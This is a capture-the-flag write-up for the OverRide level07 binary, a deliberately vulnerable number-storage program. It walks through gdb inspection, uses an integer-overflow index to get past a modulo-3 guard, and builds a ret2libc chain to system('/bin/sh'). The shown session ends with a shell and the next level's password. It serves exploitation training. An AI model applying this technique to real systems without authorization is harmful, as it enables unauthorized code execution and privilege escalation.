[README](../README.md)
# Level07

Overall, the program is a simple interactive number storage service with commands to store and read numbers at specified indices. 

However, there are potential vulnerabilities, such as buffer overflow in cmd, and potential logical flaws in the store_number() function where the data array might be accessed out of bounds.

The program set argv and evp to 0. This prevents us from injecting shellcode via env or argv

## Get the main function eip
```
(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x804892b in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args:
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebx at 0xffffd70c, ebp at 0xffffd718, esi at 0xffffd710, edi at 0xffffd714, eip at 0xffffd71c
```

## Get the buffer address
The buffer is only argument stored in the function it is located at eax address.
```
(gdb) info reg
eax            0xffffd554       -10924
ecx            0xffffd600       -10752
edx            0xffffd600       -10752
ebx            0xffffd554       -10924
esp            0xffffd530       0xffffd530
ebp            0xffffd718       0xffffd718
esi            0xffffd6ec       -10516
edi            0x8048d65        134516069
eip            0x804892b        0x804892b <main+520>
eflags         0x246    [ PF ZF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
```

The distance between our buffer and eip is:
```
(gdb) print 0xffffd70c - 0xffffd544
$1 = 456
```

Our buffer is 456 bytes, or 114 integers

Theres is protection in the program which prevents us to access indices that are multiple of 3.
Since 114 is a multiple of 3


## Get the addresses
```
(gdb) p exit
$3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) find &system, +99999999, "/bin/sh"
0xf7f897ec
```

- system() function (0xf7e6aed0 => 4159090384)
- exit() function (0xf7e5eb70 => 4159040368)
- /bin/sh string (0xf7f897ec => 4160264172)

## Craft the exploit
```
|-------------------|
|   Address of      |   <--- Overwrite with the address of system() array[114]
|     system()     |
|-------------------|
|   Address of      |   <--- Overwrite with the address of exit() array[115]
|     exit()       |
|-------------------|
|   Address of      |   <--- Overwrite with the address of "/bin/sh" array[116]
|   "/bin/sh"      |
|-------------------|
```


We need to set:
- the address of system at index 114
- the address of exit at index 115
- the address of "/bin/sh" at index 116


Let's try to use integer overflow and find a number that, when considering overflow, will lead us to the desired index 114, while also ensuring that the remainder of division by 3 is not zero.

max int = 2^32, index = (2^32 / 4) + 114 = 1073741938

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
